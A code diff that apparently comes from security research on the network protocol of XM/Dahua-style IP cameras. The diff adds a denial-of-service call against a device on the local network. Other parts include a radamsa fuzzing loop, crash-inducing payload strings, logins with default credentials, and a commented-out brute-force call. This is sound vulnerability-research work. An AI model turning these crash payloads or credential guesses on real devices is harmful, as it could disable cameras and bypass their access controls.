@@ -2,6 +2,10 @@ require "json"
 require "socket"
 
 require "./magic_fuzzer"
+require "./denial_of_service"
+
+puts DenialOfService.use_size_int("192.168.11.109", command: Command::Unknown)
+
 
 # File.open("./logs/test.log", "w+") do |file|
 #   m = MagicFuzzer(Command::SystemInfo).new(
@@ -16,15 +20,14 @@ require "./magic_fuzzer"
 #   m.close
 # end
 
-# File.open("./rsrc/op_monitor.txt", "w+") do |file|
-#   file.print Command::OPMonitor.new(session_id: 0xabcdef00_u32).to_s
+# File.open("./rsrc/get_safety_ability.txt", "w+") do |file|
+#   file.print Command::GetSafetyAbility.new(session_id: 0x00000000_u32).message
 # end
 
-# File.open("./logs/radamsa/op_monitor.log", "w+") do |file|
+# File.open("./logs/radamsa/get_safety_ability.log", "w+") do |file|
 #   puts "Testing connection"
-#   socket = MagicSocket.new("192.168.11.109", 34567)
-#   socket.login "default", Dahua.digest("tluafed")
-#   xmm = Command::OPMonitor.new
+#   socket = XMSocket.new("192.168.11.109", 34567)
+#   xmm = Command::GetSafetyAbility.new
 #   socket.send_message xmm
 #   puts "SENT: #{xmm.message}"
 #   reply = socket.receive_message
@@ -32,39 +35,55 @@ require "./magic_fuzzer"
 
 #   1000.times do |x|
 #     begin
-#       socket = MagicSocket.new("192.168.11.109", 34567)
-#       socket.login "default", Dahua.digest("tluafed")
-#       message = `radamsa ./rsrc/op_monitor.txt`
-#       file.puts "SENT: #{message.inspect}"
-#       socket.send message
+#       socket = XMSocket.new("192.168.11.109", 34567)
+#       xmm = Command::GetSafetyAbility.new
+#       xmm.message = `radamsa ./rsrc/get_safety_ability.txt` 
+#       file.puts "Sending"
+#       socket.send_message xmm
+#       file.puts "Sent: #{xmm.message.inspect}"
 #       reply = socket.receive_message
 #       file.puts "GOT: #{reply.message.inspect}"
-#     rescue e : MagicError::SocketException
+#     rescue e : XMError::SocketException
 #       puts "SOCKET DOWN! #{e.inspect}"
 #       raise e
-#     rescue e : MagicError::Exception
+#     rescue e : XMError::Exception
 #       file.puts "ERROR: #{e.inspect}"
 #       puts "ERROR: #{e.inspect}"
 #     rescue e
 #       file.puts "BAD ERROR: #{e.inspect}"
 #       puts "BAD ERROR: #{e.inspect}"
+#     ensure
+#       socket.close
 #     end
 #   end
 # end
 
+# xmm = Command::SystemInfo.new
+# socket = XMSocket.new("192.168.11.109", 34567)
+# socket.login("admin", Dahua.digest("password"))
+# socket.send_message xmm
+# puts "SENT:"
+# reply = socket.receive_message
+# puts "GOT: #{reply.message}"
+
+#Brute.run("ORsEWe7l")
 
 
+# BASIC
+# crash_string = "\xFF" + ("\x00"*13) + "\xe8\x03" + "\x00\x00\x00\x80"
+# crash_string = "{\"OPMonitor\":\"OPMonitor\",\"Name\":{\"Action\":\"Claim\",\"Parameter\":{\"Channel\":1,\"CombinMode\":\"NONE\",\"StreamType\":\"Main\",\"TransMode\":\"TCP\"}},\"SessionID\":\"9223372036854775676xAbcdef18446744073709551616\"}"
+# crash_string = "{\"GetSafetyAbility\":0}"
 
+# crash_string = "\"\""
+# puts "SENDING: #{crash_string}"
 
-
-
-
-crash_string = "\xFF" + ("\x00"*13) + "\xe8\x03" + "\x00\x00\x00\x80"
-socket = MagicSocket.new("192.168.11.109", 34567)
-socket.send crash_string
-puts "SENT: #{crash_string.inspect}"
-reply = socket.receive_message
-puts "GOT: #{reply.message}"
+# socket = XMSocket.new("192.168.11.109", 34567)
+# xmm = Command::OPMonitor.new
+# xmm.message = crash_string
+# socket.send_message xmm
+# puts "SENDING: #{crash_string}"
+# reply = socket.receive_message
+# puts "GOT: #{reply.message}"
 
 
 
@@ -102,7 +121,7 @@ puts "GOT: #{reply.message}"
 
 # xmm = Command::NoName.new
 # PASSWORD = Dahua.digest("password")
-# m = MagicSocket.new("192.168.11.109", 34567)
+# m = XMSocket.new("192.168.11.109", 34567)
 # m.login("admin", PASSWORD)
 
 # xmm.magic = 0x0000
